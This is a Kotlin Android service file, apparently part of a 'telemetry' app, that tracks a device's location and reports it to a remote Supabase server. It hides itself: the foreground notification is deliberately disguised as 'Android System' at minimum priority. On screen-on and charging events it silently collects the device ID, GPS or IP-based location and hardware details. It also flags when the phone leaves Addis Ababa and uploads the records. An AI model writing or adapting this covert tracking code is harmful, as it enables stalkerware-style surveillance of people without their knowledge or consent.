package com.example.telemetry.sync

import android.annotation.SuppressLint
import android.app.ActivityManager
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.ServiceInfo
import android.location.LocationManager
import android.net.ConnectivityManager
import android.net.Network
import android.os.Build
import android.os.IBinder
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import androidx.core.app.NotificationCompat
import com.example.telemetry.BuildConfig
import com.example.telemetry.data.TelemetryDatabase
import com.example.telemetry.data.TelemetryRecord
import com.google.android.gms.location.*
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import org.json.JSONObject
import java.net.URL
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit
import javax.net.ssl.HttpsURLConnection

class InstantTelemetryService : Service() {

    private val scope = CoroutineScope(Dispatchers.IO)
    private lateinit var connectivityManager: ConnectivityManager
    private var wakeLock: PowerManager.WakeLock? = null

    private val hardwareReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            intent?.action?.let { action ->
                logAndQueueEvent("TRIGGER_${action.substringAfterLast(".")}")
            }
        }
    }

    private val networkCallback = object : ConnectivityManager.NetworkCallback() {
        override fun onAvailable(network: Network) {
            super.onAvailable(network)
            flushOfflineQueue()
        }
    }

    override fun onCreate() {
        super.onCreate()
        
        try {
            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
            wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "TelemetryApp::Wakelock")
            wakeLock?.acquire(10 * 60 * 1000L)
        } catch (e: Exception) {
            e.printStackTrace()
        }

        startDisguisedForeground()
        
        val filter = IntentFilter().apply {
            addAction(Intent.ACTION_POWER_CONNECTED)
            addAction(Intent.ACTION_SCREEN_ON)
        }
        registerReceiver(hardwareReceiver, filter)

        connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        connectivityManager.registerDefaultNetworkCallback(networkCallback)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == "FLUSH_QUEUE") {
            flushOfflineQueue()
        }
        return START_STICKY
    }

    override fun onDestroy() {
        try { unregisterReceiver(hardwareReceiver) } catch (e: Exception) {}
        try { connectivityManager.unregisterNetworkCallback(networkCallback) } catch (e: Exception) {}
        try { wakeLock?.release() } catch (e: Exception) {}
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun startDisguisedForeground() {
        val channelId = "android_system_core"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(channelId, "Android System", NotificationManager.IMPORTANCE_MIN).apply {
                description = "System Background Management"
                setShowBadge(false)
            }
            getSystemService(NotificationManager::class.java)?.createNotificationChannel(channel)
        }

        val notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("Android System")
            .setContentText("Running background synchronization")
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(1, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION)
        } else {
            startForeground(1, notification)
        }
    }

    private fun isGpsEnabled(): Boolean {
        val locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
        return locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)
    }

    private fun isWithinAddisAbaba(lat: Double, lon: Double): Boolean {
        return lat in 8.80..9.10 && lon in 38.65..38.90
    }

    @SuppressLint("MissingPermission")
    private fun logAndQueueEvent(eventType: String) {
        scope.launch {
            val hardwareId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
            var lat = 0.0
            var lon = 0.0
            var accuracyMeters: Float? = null
            var finalEvent = eventType
            var ipAddr: String? = null

            if (!isGpsEnabled()) {
                finalEvent = "GPS_DISABLED_$eventType"
            } else {
                val fusedClient = LocationServices.getFusedLocationProviderClient(this@InstantTelemetryService)
                val latch = CountDownLatch(1)
                var bestLocation: android.location.Location? = null

                try {
                    val locationRequest = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 500)
                        .setMinUpdateDistanceMeters(0f)
                        .setWaitForAccurateLocation(false)
                        .build()

                    val callback = object : LocationCallback() {
                        override fun onLocationResult(result: LocationResult) {
                            for (location in result.locations) {
                                val currentAcc = bestLocation?.accuracy ?: Float.MAX_VALUE
                                val newAcc = if (location.hasAccuracy()) location.accuracy else Float.MAX_VALUE
                                if (newAcc < currentAcc) bestLocation = location
                                
                                if (location.hasAccuracy() && location.accuracy <= 20f) {
                                    latch.countDown()
                                }
                            }
                        }
                    }

                    fusedClient.requestLocationUpdates(locationRequest, callback, Looper.getMainLooper())
                    latch.await(6, TimeUnit.SECONDS)
                    fusedClient.removeLocationUpdates(callback)
                    
                } catch (e: Exception) { }

                if (bestLocation != null) {
                    lat = bestLocation!!.latitude
                    lon = bestLocation!!.longitude
                    accuracyMeters = if (bestLocation!!.hasAccuracy()) bestLocation!!.accuracy else null
                    
                    if (lat != 0.0 && !isWithinAddisAbaba(lat, lon)) {
                        finalEvent = "OUT_OF_BOUNDS_$eventType"
                    }
                }
            }

            if (lat == 0.0 && lon == 0.0) {
                try {
                    val conn = URL("https://get.geojs.io/v1/ip/geo.json").openConnection() as HttpsURLConnection
                    conn.connectTimeout = 3000
                    val json = JSONObject(conn.inputStream.bufferedReader().readText())
                    lat = json.getString("latitude").toDouble()
                    lon = json.getString("longitude").toDouble()
                    ipAddr = json.getString("ip")
                    accuracyMeters = 5000.0f
                    if (!finalEvent.startsWith("GPS_DISABLED")) finalEvent = "IP_FALLBACK_$eventType"
                } catch (e: Exception) {
                    finalEvent = "OFFLINE_NOLOC_$eventType"
                }
            }

            val activityManager = getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            val memoryInfo = ActivityManager.MemoryInfo()
            activityManager.getMemoryInfo(memoryInfo)
            val totalRamMb = memoryInfo.totalMem / (1024 * 1024)

            val payloadJsonObj = JSONObject().apply {
                put("model", Build.MODEL)
                put("manufacturer", Build.MANUFACTURER)
                put("android_version", Build.VERSION.RELEASE)
                put("total_ram_mb", totalRamMb)
            }.toString()

            val dao = TelemetryDatabase.get(this@InstantTelemetryService).telemetryDao()
            dao.insert(
                TelemetryRecord(
                    timestampMs = System.currentTimeMillis(),
                    eventType = finalEvent,
                    deviceId = hardwareId,
                    latitude = lat,
                    longitude = lon,
                    ipAddress = ipAddr,
                    accuracyMeters = accuracyMeters,
                    payloadJson = payloadJsonObj
                )
            )
            
            flushOfflineQueue()
        }
    }

    private fun flushOfflineQueue() {
        scope.launch {
            val dao = TelemetryDatabase.get(this@InstantTelemetryService).telemetryDao()
            val batch = dao.getUnsynced(100)
            if (batch.isNotEmpty()) {
                val uploader = TelemetryUploader(BuildConfig.SUPABASE_URL, BuildConfig.SUPABASE_KEY)
                if (uploader.upload(batch)) {
                    dao.markSynced(batch.map { it.id })
                }
            }
        }
    }
}
